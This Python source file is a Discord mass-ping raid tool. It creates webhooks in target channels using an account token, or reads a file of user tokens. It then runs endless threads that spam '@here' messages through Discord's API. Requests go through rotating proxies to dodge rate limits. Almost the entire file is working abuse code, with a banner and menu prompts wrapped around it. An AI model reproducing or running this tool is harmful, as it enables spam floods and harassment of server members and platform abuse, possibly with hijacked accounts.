import utils.pystyle
import utils.proxies
import os,_thread,sys
import time,random,threading
import json

try:
    import requests
except ModuleNotFoundError as f:
    os.system('pip install requests')
    os.system(f'"{sys.argv[0]}"')


import utils.pystyle
from utils.pystyle import Colorate,Center,Colors,Col

from utils.proxies import p as proxies


class C:
    def print(a): return print("    " + Col.white + "[" + Col.red + "X" + Col.white + "] " + a)
    def input(a): return input("    " + Col.white + "[" + Col.red + "X" + Col.white + "] " + a)

banner = """

    ▄  █▀▄▀█    ▄▄▄▄▄     ▄▀  
▀▄   █ █ █ █   █     ▀▄ ▄▀    
  █ ▀  █ ▄ █ ▄  ▀▀▀▀▄   █ ▀▄  
 ▄ █   █   █  ▀▄▄▄▄▀    █   █ 
█   ▀▄    █              ███  
 ▀       ▀                    
                              

"""

def logo():
    os.system('cls') # os.system('clear')
    print(Colorate.Vertical(Colors.DynamicMIX((Col.red, Col.black)), Center.XCenter(banner)))
        

def run():
    c_b = C.input('MassPing With Bots [y/n] : ')
    c_w = C.input('MassPing With Webhooks [y/n] : ')
    c_t = C.input('MassPing With Tokens [y/n] : ')

    if c_w == "y":
        logo()
        C.print('MassPing - Method > Webhooks (webhooks.txt)')
        webhooks = []
        channels = []
        for l in open("utils/XMSG/webhooks.txt"):
            webhooks.append(l.strip("\n"))
        for l in open("utils/XMSG/channels.txt"):
            channels.append(l.strip("\n"))
        if int(len(webhooks)) < 5:
            token = C.input('Token With Webhook Permission : ')
            headers = {
                'Authorization': token,
                'Content-Type': 'application/json',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36'
            }
            for _i in channels:
                for _ in range(4):
                    r = requests.post('https://discord.com/api/v9/channels/' + str(_i) + '/webhooks',headers=headers,json={"name": "Captain Hook"},proxies={"http": proxies.get()})
                    if r.status_code == 200:
                        config = json.loads(r.text)
                        if config['token']:
                            webhooks.append('https://discord.com/api/webhooks/' + str(config['id']) + '/' + str(config['token']))
                    time.sleep(.65)
            if os.path.isfile('utils/XMSG/webhooks.txt'):
                f = open('utils/XMSG/webhooks.txt', 'r+')
                f.truncate(0)
            else:
                C.print('Error With File (utils/XMSG/webhooks.txt)')

            with open('utils/XMSG/webhooks.txt', "a") as f:
                for l in webhooks:
                    f.write(l + '\n')
        
        def loop(l): 
            while True: 
                requests.post(l, json={"content": "@here Hey ! I Love Discord and TOS !"},proxies={"http": proxies.get()}) 
                time.sleep(.2)

        for l in webhooks:
            threading.Thread(target=loop, args=(l,)).start()
            

    if c_t == "y":
        logo()
        C.print('MassPing - Method > Tokens (tokens.txt)')
        tokens = []
        for line in open("tokens.txt"):
            tokens.append(line.strip("\n"))
        def loop(token,channel):
            C.print('Connecting With [' + token + ']')
            headers = {
                'Authorization': token,
                'Content-Type': 'application/json',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36'
            }
            while True:
                requests.post('https://discord.com/api/v9/channels/' + str(channel) + '/messages',headers=headers,json={"content":"@here Hey ! I Love Discord and TOS !"},proxies={"http": proxies.get()})
                time.sleep(.5)
        for t in tokens:
            channel = C.input('Channel ID : ')
            threading.Thread(target=loop, args=(t,channel,)).start()



if __name__ == "__main__":
    logo()
    run()